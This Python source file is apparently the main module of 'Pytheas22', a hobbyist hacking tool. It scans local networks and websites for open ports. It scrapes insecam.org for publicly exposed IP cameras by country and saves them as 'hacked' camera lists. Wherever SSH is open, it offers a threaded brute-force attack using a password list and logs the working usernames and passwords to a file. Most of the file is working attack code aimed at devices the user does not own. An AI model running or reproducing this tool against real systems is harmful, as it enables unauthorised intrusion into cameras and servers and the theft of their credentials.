import os
import random
import shutil
import socket
import string
import subprocess
import threading
import time
import BetterPrinting as bp
import re
import sqlite3
from requests.structures import CaseInsensitiveDict
import requests
import colorama
from Pytheas22 import port_data
import logging
from logging import NullHandler
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import sys
import csv

string_port = """

                                                                                           
        ***** **                               *                                           
     ******  ****                      *     **                                            
    **   *  *  ***                    **     **                                            
   *    *  *    ***                   **     **                                            
       *  *      ** **   ****       ******** **                                ****        
      ** **      **  **    ***  *  ********  **  ***      ***       ****      * **** *     
      ** **      **  **     ****      **     ** * ***    * ***     * ***  *  **  ****      
    **** **      *   **      **       **     ***   ***  *   ***   *   ****  ****           
   * *** **     *    **      **       **     **     ** **    *** **    **     ***          
      ** *******     **      **       **     **     ** ********  **    **       ***        
      ** ******      **      **       **     **     ** *******   **    **         ***      
      ** **          **      **       **     **     ** **        **    **    ****  **      
      ** **           *********       **     **     ** ****    * **    **   * **** *   n n 
      ** **             **** ***       **    **     **  *******   ***** **     ****    u u 
 **   ** **                   ***             **    **   *****     ***   **            m m 
***   *  *             *****   ***                  *                                  b b 
 ***    *            ********  **                  *                                   e e 
  ******            *      ****                   *                                    r r 
    ***                                          *                                     2 2 
                                                                                           



            ~Created by: Kill0geR~
            WELCOME TO PYTHEAS22
"""


class PortScanner:
    ip_subnett = []
    waiting = False
    well_known_ports = [20, 21, 22, 23, 25, 53, 80, 110, 119, 123, 135, 139, 143, 161, 194, 389, 443, 445, 515, 520,
                        636, 3389, 5060, 5061, 5357, 8001, 8002, 8080, 9080, 9999, 62078]
    is_web = False
    all_colors = ["red", "blue", "green", "cyan", "yellow", "magenta"]
    random_color = random.choice(all_colors)
    ssh_port = []
    every_ip_with_name = []
    my_ip_address = None
    check_open_port = []

    def __init__(self):
        self.headers = None
        self.country_name = None
        self.addresses = None
        self.gui = string_port

    def cool_text(self):
        thread_wait = threading.Thread(target=PortScanner.wait)
        thread_wait.start()
        time.sleep(5)
        PortScanner.waiting = True
        time.sleep(1)
        PortScanner.waiting = False

    def get_lst(self, port_range="20-80", known_ports=False):
        error = "ERROR (EXAMPLE: 20-80)"
        if known_ports is True:
            return PortScanner.well_known_ports

        try:
            if "-" in port_range:
                try:
                    return range(int(port_range.split("-")[0]), int(port_range.split("-")[1]) + 1)
                except ValueError:
                    return error
            else:
                print(error)
                quit()
        except TypeError:
            return error

    @staticmethod
    def check_char(wort, idx, zeichen):
        wort = [*wort]
        wort[idx] = zeichen
        wort = "".join(wort)
        return wort

    @staticmethod
    def print_text(word):
        color = bp.color(f"\r{word}", PortScanner.random_color, False)
        print(color, end="")

    @staticmethod
    def wait():
        wort = "Welcome to PYTHEAS22".upper()
        print()
        while True:
            for idx, letter in enumerate(wort):
                try:
                    if letter.upper() == letter:
                        new = letter.lower()
                    else:
                        new = letter.upper()

                    wort = PortScanner.check_char(wort, idx, new)

                    if "2" == letter:
                        wort = PortScanner.check_char(wort, idx, "?")

                    elif "?" == letter:
                        wort = PortScanner.check_char(wort, idx, "2")
                    PortScanner.print_text(wort)
                    time.sleep(0.1)
                    wort = PortScanner.check_char(wort, idx, letter)
                    PortScanner.print_text(wort)

                    if PortScanner.waiting:
                        print()
                        sys.exit()
                except KeyboardInterrupt:
                    quit()

    @staticmethod
    def add_to_db(country_names, ip_address, open_ports, name=""):
        if name != "":
            port_name = f"{country_names[name]}_Ports.db"
        else:
            port_name = f"Ports.db"
        con = sqlite3.connect(port_name)

        cur = con.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS Ports
                        (IPAddress PRIMARY KEY, Open Ports)''')

        cur.execute("INSERT OR IGNORE INTO Ports VALUES (?,?)",
                    (ip_address, open_ports))
        con.commit()

    @staticmethod
    def add_to_db_intern(ip_address, open_ports):
        con = sqlite3.connect('Internal_Network.db')

        cur = con.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS Ports
                                (IPAddress PRIMARY KEY, Open Ports, Time)''')

        cur.execute("INSERT OR IGNORE INTO Ports VALUES (?,?,?)",
                    (ip_address, open_ports, time.strftime("%d.%m.%y - %H:%M")))
        con.commit()

    @classmethod
    def get_ip(cls):
        open_ports = subprocess.run(["ip", "a"], capture_output=True)
        everything = str(open_ports).split()
        ipaddress = [everything[ip + 1] for ip, inet in enumerate(everything) if inet == "inet"]

        for each_ip in ipaddress:
            real_ip = each_ip.split("/")
            if real_ip[0] != "127.0.0.1":
                cls.ip_subnett.append((real_ip[0], real_ip[1]))

        host = cls.ip_subnett[0][0].split(".")
        host[-1] = "0"
        host_ip = ".".join(host)
        return host_ip, cls.ip_subnett

    def counter(self, country):
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{country}", headers=self.headers
        )
        last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
        all_ips = []
        for page in range(int(last_page)):
            res = requests.get(
                f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                headers=self.headers
            )
            find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)

            all_ips.extend(find_ip)
            amount = bp.color(f"\rScanning {page + 1} of {int(last_page)}".upper(), PortScanner.random_color, False)
            print(amount, end="")
        directory = f"{self.country_name[country]}_hacked_IP_Cameras"
        if os.path.exists(directory):
            shutil.rmtree(directory)

        os.mkdir(directory)
        os.chdir(directory)
        with open(f"{self.country_name[country]}_IP-Cameras.txt", "a+") as file:
            for each_ip in all_ips:
                file.write(f"{each_ip}\n")

        return all_ips

    def ask_range(self):
        lst_everything = []
        str_quest = bp.color("Do you want to parse through wellknown ports? y/n: ", PortScanner.random_color, False)
        question = input(str_quest)

        if question == "y":
            lst_everything.extend(PortScanner.well_known_ports)
        else:
            bp.color(
                "To specify the range you simply write 'number1-number2'. Number 1 should be smaller than number 2",
                PortScanner.random_color)
            str_range = bp.color("What is your range: ", PortScanner.random_color, False)
            while True:
                str_port_range = input(str_range)
                if "-" in str_port_range:
                    try:
                        first_number, second_number = int(str_port_range.split("-")[0]), int(
                            str_port_range.split("-")[1])
                        if first_number > second_number:
                            print("SECOND NUMBER IS GREATER THAN THE FIRST NUMBER. (min-max)")
                            continue

                        real_range = PortScanner.get_lst(PortScanner, port_range=str_port_range)
                        lst_everything.extend(real_range)
                        return lst_everything

                    except:
                        print("PLEASE TYPE INT")
                        continue


                else:
                    print("PLEASE WRITE A RANGE. EXAMPLE '20-80'")
                    continue
        return lst_everything

    def get_name(self, mac_address):
        data = requests.get(f"https://maclookup.app/search/result?mac={mac_address}")
        split_data = data.text.split("\n")

        if "No assignment is found for this MAC" not in data.text:
            get_action = [every_action for every_action in split_data if
                          '<div class="col-md-12" style="padding-bottom: 1em">' in every_action]
            get_name = get_action[0].split("h2")
            second = get_name[1]
            this_name = second.split("<")
            real_name = this_name[0].replace(">", "")
            return real_name

        else:
            return "Unknown"

    def pinging(self, ip):
        ping = subprocess.run(["ping", ip, "-n", "1", "-w", "1000"], capture_output=True)

    def internal_windows(self):
        cmd = subprocess.run(["ipconfig", "/all"], capture_output=True)
        split_cmd = str(cmd).split()

        klammer = r"\d+.\d+.\d+.\d+"
        get_all = re.findall(klammer, str(cmd))
        data = [every for every in split_cmd if "(" in every]

        all_ips = [each for each in get_all for every_data in data if each in every_data]

        valid_ip = []
        for every_ip in all_ips:
            try:
                socket.inet_aton(every_ip)
                valid_ip.append(every_ip)
            except socket.error:
                continue

        PortScanner.my_ip_address = valid_ip[-1]
        getlast = PortScanner.my_ip_address.split(".")
        spalten = [f"{'.'.join(getlast[0:3])}.{block_number}" for block_number in range(1, 255)]
        for all_ip in spalten:
            t = threading.Thread(target=PortScanner.pinging, args=(PortScanner,all_ip,))
            t.start()

        time.sleep(1)
        arp = subprocess.run(["arp", "-a"], capture_output=True)
        split_data = str(arp).split()

        indexes = []
        for idx, arp_ip in enumerate(split_data):
            if f"{'.'.join(getlast[0:3])}" in arp_ip:
                if arp_ip != PortScanner.my_ip_address:
                    mac_ip = split_data[idx + 1]
                    if mac_ip != "ff-ff-ff-ff-ff-ff":
                        indexes.append((arp_ip, mac_ip))

        ip_name = [(ip, PortScanner.get_name(PortScanner, mac)) for ip, mac in indexes]
        return ip_name

    @staticmethod
    def internal_network():
        global this_ip
        bp.color("ALL THE DEVICES IN YOUR NETWORK WILL BE SHOWN SOON", PortScanner.random_color)
        if sys.platform == "linux":
            threading_wait = threading.Thread(target=PortScanner.wait)
            threading_wait.start()
            host_ip = PortScanner.get_ip()
            PortScanner.my_ip_address = host_ip[1][0][0]
            all_data = subprocess.run(["nmap", "-sn", f"{host_ip[0]}/{host_ip[1][0][1]}"], capture_output=True)
            PortScanner.waiting = True
            time.sleep(0.6)
            PortScanner.waiting = False
            get_everything = str(all_data).split()
            all_ips = [(get_everything[idx + 1].replace("\\nHost", ""), get_everything[idx + 2].replace("\\nHost", ""),
                        get_everything[idx + 8].replace("\\nNmap", "").replace("(", "").replace(")", "")) for idx, ip in
                       enumerate(get_everything) if ip == "for"]
            internal_networks = [ips[0] for ips in all_ips if not re.search("[a-zA-Z]", ips[0])]
            others = [name for name in all_ips if re.search("[a-zA-Z]", name[0])]

            for every_ip in all_ips:
                for this_ip in internal_networks:
                    if this_ip == every_ip[0]:
                        if not re.search("[a-zA-Z]", every_ip[2]):
                            PortScanner.every_ip_with_name.append((this_ip, "Unknown"))
                        else:
                            PortScanner.every_ip_with_name.append((this_ip, every_ip[2]))

            if others:
                for not_in_lst in others:
                    PortScanner.every_ip_with_name.append((not_in_lst[1].replace("(", "").replace(")", ""), not_in_lst[0]))

        elif sys.platform == "win32" or sys.platform == "windows" or sys.platform == "win64":
            win_threading_wait = threading.Thread(target=PortScanner.wait)
            win_threading_wait.start()
            PortScanner.every_ip_with_name = PortScanner.internal_windows(PortScanner)
            time.sleep(0.5)
            PortScanner.waiting = True

        print()
        all_intern_ip = []
        just_ips = []
        for number, every_ip in enumerate(PortScanner.every_ip_with_name):
            ip_name = every_ip[1]
            all_intern_ip.append(every_ip[0])
            try:
                iphone = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                iphone.settimeout(0.5)
                iphone.connect((every_ip[0], 62078))
                ip_name = "APPLE DEVICE"
            except:
                pass
            if every_ip[0] == PortScanner.my_ip_address:
                ip_name = "MY IP-ADDRESS"

            bp.color(f"[{number + 1}]: {every_ip[0]}          {ip_name}", PortScanner.random_color)
            just_ips.append(every_ip[0])

        while True:
            scan_intern = bp.color("\nDo you want to scan all ip's? [y/n]: ".upper(), PortScanner.random_color, False)
            answer_intern = input(scan_intern)

            if answer_intern.lower() == "n":
                break

            elif answer_intern.lower() == "y":
                for idx, every_port in enumerate(all_intern_ip):
                    counter = bp.color(f"\nScanning {idx + 1} of {len(all_intern_ip)}\n".upper(),
                                       PortScanner.random_color, False)
                    print(counter, end="")
                    PortScanner.start_scanning(PortScanner, PortScanner.well_known_ports, every_port, print_text=False, ssh=True, scan_internal_ip=True)

                if PortScanner.ssh_port:
                    PortScanner.hack_ip_ssh(PortScanner,PortScanner.ssh_port)

                bp.color("All open ports in your network has been saved to 'Internal_Network.db'", PortScanner.random_color)
                quit()

        while True:
            try:
                str_this_ip = bp.color("Which ip do you want to scan (just write the number of your ip)?: ",
                                       PortScanner.random_color, False)
                this_ip = int(input(str_this_ip))
                if this_ip <= 0:
                    print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
                    continue
                else:
                    this_ip = just_ips[this_ip - 1]
                break
            except ValueError:
                print("PLEASE WRITE NUMBERS NOT STRINGS")
                continue

            except IndexError:
                print("PLEASE WRITE A NUMBER THAT IS ABOVE YOU")
                continue
        return this_ip

    # David Bombal's Code big thanks to him
    def ssh_connect(self, host, username, password):
        ssh_client = SSHClient()
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh_client.connect(host, port=22, username=username, password=password, banner_timeout=300)
            with open("credentials_found.txt", "a") as file:
                bp.color(f"Username - {username} and Password - {password} found for {host}!!!!1", PortScanner.random_color)
                file.write(f"\nUsername: {username}\nPassword: {password}\nWorked on host {host}\nTime: {time.strftime('%H:%M: - %d.%m.%y')}")
                bp.color("CHECK 'credentials_found.txt' TO SEE YOUR PASSWORD", PortScanner.random_color)
                time.sleep(1)
        except AuthenticationException:
            bp.color(f"Username - {username} and Password - {password} is Incorrect for {host}", PortScanner.random_color)
        except ssh_exception.SSHException:
            bp.color("**** Attempting to connect - Rate limiting on server ****", PortScanner.random_color)

    def hack_ip_ssh(self, ssh_lst):
        if len(ssh_lst) == 1:
            self.addresses = f"\nThe IP-Address {ssh_lst[0]} has the ssh port opened. Do you want to bruteforce that ip? [y/n]: ".upper()
        else:
            self.addresses = f"\nMultiple addresses you have scanned have the ssh port opened {ssh_lst}. Do you want to brutefore those ip's? [y/n]: ".upper()

        while True:
            ssh_question = bp.color(self.addresses, PortScanner.random_color, False)
            question = input(ssh_question)
            if question.lower() == "n":
                bp.color("\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)
                break

            elif question.lower() == "y":
                bp.color("\nTHANK YOU FOR USING PYTHEAS22\nSTARTING BRUTEFORCE\n", PortScanner.random_color)
                logging.getLogger('paramiko.transport').addHandler(NullHandler())
                list_file = "passwords.csv"
                all_passwords = []
                try:
                    with open(list_file, "r+") as file:
                        csv_reader = csv.reader(file, delimiter=",")
                        all_passwords.extend(csv_reader)
                except FileNotFoundError:
                    bp.color(f"'passwords.csv' could not be found. Download the file on my github: https://github.com/Kill0geR/Pytheas22", PortScanner.random_color)
                    quit()

                for host in ssh_lst:
                    for index, row in enumerate(all_passwords):
                        t = threading.Thread(target=self.ssh_connect, args=(PortScanner, host, row[0], row[1],))
                        t.start()
                        time.sleep(0.2)

                break

    def start_scanning(self, port_lst, this_ip, print_text=True, country=None, ssh=False, scan_internal_ip=False):
        original = this_ip
        open_ports = []
        if "http" in this_ip:
            this_ip = this_ip.split("/")[2]
            if ":" in this_ip:
                this_ip = this_ip.split(":")[0]
            PortScanner.is_web = True

        else:
            for each in [*this_ip]:
                if each in string.ascii_lowercase:
                    bp.color("PLEASE USE THE FULL LINK. WITH IS CORRESPONDING PROTOCOL (e.g https://google.com)",
                             PortScanner.random_color)
                    quit()
        print()
        if "http" in original: bp.color(f"Scanning the website: ".upper()+f'{original}\n', PortScanner.random_color)
        else: bp.color(f"Scanning the ip-address: '{original}'\n".upper(), PortScanner.random_color)

        for port in port_lst:
            bp.color(f"SCANNING PORT: {port}", PortScanner.random_color)
            try:
                start = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                start.settimeout(0.5)
                try:
                    start.connect((this_ip, port))
                    open_ports.append(port)
                    self.check_open_port.append(port)
                    if port == 22: self.ssh_port.append(this_ip)

                except TimeoutError:
                    continue

                except socket.gaierror:
                    if not PortScanner.is_web:
                        if print_text:
                            bp.color("THIS IP IS NOT AVAILABLE", PortScanner.random_color)
                    else:
                        if print_text:
                            bp.color(f"WEBSITE: {this_ip} IS NOT AVAILABLE", PortScanner.random_color)
                    quit()

                except KeyboardInterrupt:
                    quit()

                except:
                    pass
            except ConnectionRefusedError:
                pass

        if PortScanner.is_web:
            output = subprocess.run(["nslookup", this_ip], capture_output=True)
            new_data = str(output).split("\\n")
            all_addresses = [addr.split(":")[1].replace(addr.split(":")[1][0], "") for addr in new_data if
                             "Address" in addr if "." in addr if "#" not in addr]
            if len(all_addresses) == 1:
                if print_text:
                    bp.color(f"Website {this_ip} has 1 address", PortScanner.random_color)
                    bp.color(f"{all_addresses[0]} is the ip address of {this_ip}\n", PortScanner.random_color)

            else:
                if print_text:
                    bp.color(f"Website {this_ip} has {len(all_addresses)} addresses\n", PortScanner.random_color)
                    for idx, each_addr in enumerate(all_addresses): bp.color(
                        f"[{idx + 1}] {each_addr} is one of the addresses of {this_ip}", PortScanner.random_color)

        print()
        if open_ports:
            if print_text:
                this_lst = [bp.color(f"{this_ip} has port {each_port} opened | {port_data.check_ports(each_port, this_ip)}", PortScanner.random_color, False) for
                            each_port in open_ports]
                bp.ui.list(this_lst, f"ALL OPEN PORTS FOR {this_ip}")

            if country is not None:
                PortScanner.add_to_db(self.country_name, this_ip, "".join(str(open_ports)), name=country)

            if self.ssh_port and country is None and ssh is True and scan_internal_ip is False:
                PortScanner.hack_ip_ssh(PortScanner, self.ssh_port)

            if scan_internal_ip:
                PortScanner.add_to_db_intern(this_ip, "".join(str(open_ports)))

        else:
            if print_text:
                if 62078 not in port_lst:
                    bp.color(f"\nThis IP-Address: {this_ip} has no ports open from {port_lst[0]}-{port_lst[-1]}", PortScanner.random_color)
                else: bp.color(f"\nThis IP-Address: {this_ip} has no ports open from all wellknown ports", PortScanner.random_color)
        if print_text and not self.ssh_port:
            bp.color("\nTHANK YOU FOR USING PYTHEAS22", PortScanner.random_color)

    def ip_cameras(self, port_lst=None, ssh=False):
        colorama.init()

        url = "http://www.insecam.org/en/jsoncountries/"

        self.headers = CaseInsensitiveDict()
        self.headers[
            "Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        self.headers["Cache-Control"] = "max-age=0"
        self.headers["Connection"] = "keep-alive"
        self.headers["Host"] = "www.insecam.org"
        self.headers["Upgrade-Insecure-Requests"] = "1"
        self.headers[
            "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

        resp = requests.get(url, headers=self.headers)

        data = resp.json()
        countries = data['countries']

        self.country_name = {}
        bp.color("ALL COUNTRIES WITH IP-CAMERAS WILL BE SHOWN SOON", PortScanner.random_color)
        PortScanner.cool_text(PortScanner)

        for key, value in countries.items():
            bp.color(f'Code : ({key}) - {value["country"]} / ({value["count"]})  ',
                     PortScanner.random_color)
            print("")
            self.country_name[key] = value["country"]

        while True:
            country = bp.color(
                "\nWhich country do you want to scan. Write the code for example 'LA' for Laos (vpn is recommended): ".upper(),
                PortScanner.random_color, False)
            answer = input(country)
            if answer.upper() in self.country_name:
                hacked_country = self.country_name[answer.upper()]
                if port_lst is None:
                    all_lst = PortScanner.ask_range(PortScanner)
                else:
                    all_lst = port_lst

                bp.color(f"\nGetting all the ip-cameras of {hacked_country}\n".upper(),
                         PortScanner.random_color)
                get_all_ports = PortScanner.counter(self, answer.upper())
                bp.color(f"\n'{hacked_country}_hacked_IP_CAMERAS' HAS BEEN MADE ALL DATA WILL BE STORED IN THERE", PortScanner.random_color)
                bp.color(
                    f"ALL IP-CAMERAS WITH THEIR LINK HAS BEEN SAVED IN '{hacked_country}_IP-Cameras.txt'",
                    PortScanner.random_color)
                bp.color(f"EVERY OPEN PORT OF THE IP-CAMERAS IN {hacked_country} WILL BE SAVED IN AN DATABASE CALLED {hacked_country}_Ports.db", PortScanner.random_color)
                PortScanner.cool_text(PortScanner)

                bp.color("\nSTARTING\n", PortScanner.random_color)
                for idx, every_port in enumerate(get_all_ports):
                    counter = bp.color(f"\nScanning {idx + 1} of {len(get_all_ports)}\n".upper(),
                                       PortScanner.random_color, False)
                    print(counter, end="")
                    PortScanner.start_scanning(PortScanner, all_lst, every_port, print_text=False, country=answer.upper(), ssh=True)
                os.chdir("..")

                if self.ssh_port:
                    PortScanner.hack_ip_ssh(PortScanner, self.ssh_port)
                if self.check_open_port:
                    print(f"ALL OPEN PORTS HAVE BEEN SAVED IN THE DATABASE '{hacked_country}_Ports.db'")
                print(f"ALL LINKS HAVE BEEN SAVED IN {hacked_country}.\nTHANK YOU FOR USING PYTHEAS22")
                sys.exit()

            else:
                bp.color(f"{answer} is not in the list", PortScanner.random_color)
                continue

    def question(self):
        if sys.platform == "linux":
            if os.getuid() != 0:
                bp.color(string_port, PortScanner.random_color)
                bp.color("\nThis program must be run in root!!!!\n".upper(), "red")
                quit()

        bp.color(string_port, PortScanner.random_color)
        check_website = 0

        while True:
            global this_ip
            lst_everything = []
            str_internal = bp.color("\n\nDo you want to scan your network? [y/n]: ".upper(), PortScanner.random_color, False)
            internal_ips = input(str_internal)

            if internal_ips.lower() == "y":
                PortScanner.internal_network()
                break
            elif internal_ips.lower() == "n":
                while True:
                    global this_ip
                    multiple = bp.color("Do you want to scan IP-CAMERAS [y/n]: ".upper(), PortScanner.random_color, False)
                    quest = input(multiple)

                    if quest.lower() == "n":
                        str_an_ip = bp.color("Which ip or website do you want to Scan: ", PortScanner.random_color, False)
                        this_ip = input(str_an_ip)
                        check_website += 1
                        break
                    elif quest.lower() == "y":
                        PortScanner.ip_cameras(PortScanner)

            elif internal_ips.lower() != "y" or internal_ips.lower() != "n":
                print("y or n please !!!".upper())
                continue
            if check_website >= 1:
                break

        lst_port = PortScanner.ask_range(PortScanner)
        lst_everything.extend(lst_port)

        PortScanner.start_scanning(PortScanner, lst_everything, this_ip, ssh=True)
